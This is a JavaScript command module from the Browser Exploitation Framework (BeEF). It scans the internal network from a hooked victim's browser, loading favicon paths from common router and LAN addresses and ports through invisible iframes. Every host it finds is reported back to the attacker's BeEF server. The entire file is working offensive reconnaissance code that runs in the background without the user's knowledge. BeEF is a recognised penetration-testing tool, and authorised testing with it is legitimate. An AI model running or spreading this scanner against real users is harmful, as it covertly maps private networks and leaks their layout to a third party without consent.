//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips     = "<%= @rhosts %>";
  var ports   = "<%= @ports %>";
  var timeout = parseInt("<%= @timeout %>", 10)*1000;
  var wait    = parseInt("<%= @wait %>", 10)*1000;
  var threads = parseInt("<%= @threads %>", 10);
  var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');

  if(beef.browser.isO()) {
    beef.debug("[Favicon Scanner] Browser is not supported.");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
    return;
  }

  var sort_unique = function (arr) {
    arr = arr.sort(function (a, b) { return a*1 - b*1; });
    var ret = [arr[0]];
    for (var i = 1; i < arr.length; i++) {
        if (arr[i-1] !== arr[i]) {
            ret.push(arr[i]);
        }
    }
    return ret;
  }

  // set target ports
  var is_valid_port = function(port) {
    if (isNaN(port)) return false;
    if (port > 65535 || port < 0) return false;
    return true;
  }
  ports = ports.split(',');
  var target_ports = new Array();
  for (var i=0; i<ports.length; i++) {
    var p = ports[i].replace(/(^\s+|\s+$)/g, '');
    if (is_valid_port(p)) target_ports.push(p);
  }
  ports = sort_unique(target_ports);
  if (ports.length == 0) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no ports specified", beef.are.status_error());
    return;
  }

  // set target IP addresses
  var is_valid_ip = function(ip) {
    if (ip == null) return false;
    var ip_match = ip.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (ip_match == null) return false;
    return true;
  }
  var is_valid_ip_range = function(ip_range) {
    if (ip_range == null) return false;
    var range_match = ip_range.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range_match == null || range_match[1] == null) return false;
    return true;
  }
  if (ips == 'common') {
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254' ];
  } else {
    ips = ips.split(',');
    var target_ips = new Array();
    for (var i=0; i<ips.length; i++) {
      var ip = ips[i].replace(/(^\s+|\s+$)/g, '');
      if (is_valid_ip(ip)) target_ips.push(ip);
      else if (is_valid_ip_range(ip)) {
        ipBounds   = ip.split('-');
        lowerBound = ipBounds[0].split('.')[3];
        upperBound = ipBounds[1].split('.')[3];
        for (var i = lowerBound; i <= upperBound; i++) {
          target_ips.push(ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i);
        }
      }
    }
    ips = sort_unique(target_ips);
    if (ips.length == 0) {
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed target IP address(es) supplied", beef.are.status_error());
        return;
    }
  }

  // request the specified paths from the specified URL
  // and report all live URLs back to BeEF
  checkFavicon = function(proto, ip, port, uri) {
    var img = new Image;
    var dom = beef.dom.createInvisibleIframe();
    beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
    img.src = proto+"://"+ip+":"+port+uri;
    img.onerror = function() { dom.removeChild(this); }
    img.onload = function() {
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src));dom.removeChild(this);
      beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
    }
    dom.appendChild(img);
    // stop & remove iframe
    setTimeout(function() {
      if (dom.contentWindow.stop !== undefined) {
        dom.contentWindow.stop();
      } else if (dom.contentWindow.document.execCommand !== undefined) {
        dom.contentWindow.document.execCommand("Stop", false);
      }
      document.body.removeChild(dom);
    }, timeout);
  }

  // configure workers
  WorkerQueue = function(id, frequency) {
    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();
    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Favicon Scanner] Worker #"+id+" has finished ["+interval+" ms]");
        return;
      }
    }
    this.queue = function(item) {
      stack.push(item);
      if (timer === null) timer = setInterval(this.process, frequency);
    }
  }

  // create workers
  var workers = new Array();
  for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, wait));

  // for each favicon path:
  for (var u=0; u < urls.length; u++) {
    var worker = workers[u % threads];
    // for each LAN IP address:
    for (var i=0; i < ips.length; i++) {
      // for each port:
      for (var p=0; p < ports.length; p++) {
        var host = ips[i];
        var port = ports[p];
        if (port == '443') var proto = 'https'; else var proto = 'http';
        // add URL to worker queue
        worker.queue('checkFavicon("'+proto+'","'+host+'","'+port+'","'+urls[u]+'");');
      }
    }
  }

});

